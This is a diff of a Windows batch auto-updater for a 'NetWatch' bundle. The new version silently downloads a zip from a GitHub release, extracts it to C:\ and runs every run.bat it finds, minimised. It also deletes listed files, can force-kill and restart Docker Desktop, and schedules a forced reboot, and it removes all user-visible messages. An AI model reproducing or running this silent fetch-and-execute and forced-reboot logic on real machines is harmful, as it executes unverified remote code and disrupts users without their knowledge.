@@ -1,111 +1,52 @@
-:: VER=11
+:: VER=1.0.0
 @echo off
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
-
-set "ZIP_URL=https://github.com/yao666999/hysteria/releases/download/hysteria2/NetWatch.zip"
 set "TARGET_DIR=C:\"
-set "DELETE_LIST=C:\NetWatch\CoreService.bat;C:\NetWatch\ProxifierSetup.exe"
-
-echo ========================================
-echo   Heartbeat 自动更新
-echo ========================================
-echo.
-echo 时间: %date% %time%
-echo 目标: C:\NetWatch\
-echo.
+set "RESTART_AFTER_UPDATE=1"
+set "RESTART_DOCKER_DESKTOP=0"
+set "DELETE_LIST=C:\NetWatch\CoreService.bat"
+set "HEARTBEAT_SCRIPT="
+set "DOCKER_DESKTOP_EXE=C:\Program Files\Docker\Docker\Docker Desktop.exe"
+set "ZIP_URL=https://github.com/yao666999/heartbeat/releases/download/heartbeat/NetWatch.zip"
 if defined DELETE_LIST call :DELETE_FILES "%DELETE_LIST%"
-
-echo [1/3] 下载中...
 set "ZIP_FILE=%TEMP%\NetWatch_%RANDOM%.zip"
-
 powershell -Command "$ProgressPreference='SilentlyContinue'; (New-Object System.Net.WebClient).DownloadFile('%ZIP_URL%', '%ZIP_FILE%')" >nul 2>&1
-
-if not exist "%ZIP_FILE%" (
-    echo [失败] 下载失败
-    exit /b 1
-)
-
-echo [成功] 下载完成
-echo.
-echo [2/3] 解压中...
+if not exist "%ZIP_FILE%" exit /b 1
 powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TARGET_DIR%' -Force" >nul 2>&1
-
-if not exist "C:\NetWatch" (
-    echo [失败] 解压失败
-    del "%ZIP_FILE%" >nul 2>&1
-    exit /b 1
-)
-
-echo [成功] 解压完成
+if not exist "C:\NetWatch" (del "%ZIP_FILE%" >nul 2>&1 & exit /b 1)
 del "%ZIP_FILE%" >nul 2>&1
-echo.
-echo [3/3] 启动监控...
-
-set "RUN_COUNT=0"
-for /r "C:\NetWatch" %%F in (run.bat) do if exist "%%F" (
-    echo 启动: %%F
-    cd /d "%%~dpF" && start /min "" cmd /c "%%F"
-    set /a "RUN_COUNT+=1"
-)
-
-if %RUN_COUNT% gtr 0 (
-    echo [成功] 已启动 %RUN_COUNT% 个监控程序
-) else (
-    echo [警告] 未找到 run.bat 文件
-)
-
-echo.
-echo ========================================
-echo 完成！
-echo ========================================
-echo.
-
+if exist "%HEARTBEAT_SCRIPT%" (cd /d "C:\NetWatch\heartbeat" && start /min "" cmd /c "%HEARTBEAT_SCRIPT%")
+for /r "C:\NetWatch" %%F in (run.bat) do if exist "%%F" (cd /d "%%~dpF" && start /min "" cmd /c "%%F")
+call :MAYBE_RESTART_DOCKER_DESKTOP
+call :MAYBE_RESTART
 exit /b 0
-
+:MAYBE_RESTART_DOCKER_DESKTOP
+if not "%RESTART_DOCKER_DESKTOP%"=="1" goto :EOF
+if not exist "%DOCKER_DESKTOP_EXE%" goto :EOF
+call :KILL_PROCESS "Docker Desktop.exe"
+timeout /t 8 /nobreak >nul 2>&1
+start "" "%DOCKER_DESKTOP_EXE%" >nul 2>&1
+goto :EOF
+:KILL_PROCESS
+set "PROC_NAME=%~1"
+if "%PROC_NAME%"=="" goto :EOF
+taskkill /f /im "%PROC_NAME%" >nul 2>&1
+taskkill /f /im "%PROC_NAME%" /t >nul 2>&1
+taskkill /f /im "%PROC_NAME%" >nul 2>&1
+goto :EOF
+:MAYBE_RESTART
+if "%RESTART_AFTER_UPDATE%"=="1" shutdown /r /t 120 /f >nul 2>&1
+goto :EOF
 :DELETE_FILES
 setlocal EnableDelayedExpansion
 set "paths=%~1"
-
-if "%paths%"=="" (
-    endlocal
-    goto :EOF
-)
-
-echo.
-echo [清理] 删除指定文件...
+if "%paths%"=="" (endlocal & goto :EOF)
 for %%P in ("%paths:;=" "%") do (
-    set "path=%%~P"
-    if exist "!path!" (
-        if exist "!path!\*" (
-            echo   删除目录: !path!
-            rd /s /q "!path!" 2>nul
-            if !errorLevel! equ 0 (
-                echo   [成功] 目录已删除
-            ) else (
-                echo   [警告] 目录删除失败
-            )
-        ) else (
-            echo   删除文件: !path!
-            del /f /q "!path!" 2>nul
-            if !errorLevel! equ 0 (
-                echo   [成功] 文件已删除
-            ) else (
-                echo   [警告] 文件删除失败
-            )
-        )
-    ) else (
-        echo   [跳过] 不存在: !path!
-    )
+set "path=%%~P"
+if exist "!path!" (
+if exist "!path!\*" (rd /s /q "!path!" 2>nul) else (del /f /q "!path!" 2>nul)
 )
-
-echo [完成] 清理结束
-echo.
-
+)
 endlocal
 goto :EOF
-
-
-
-
-
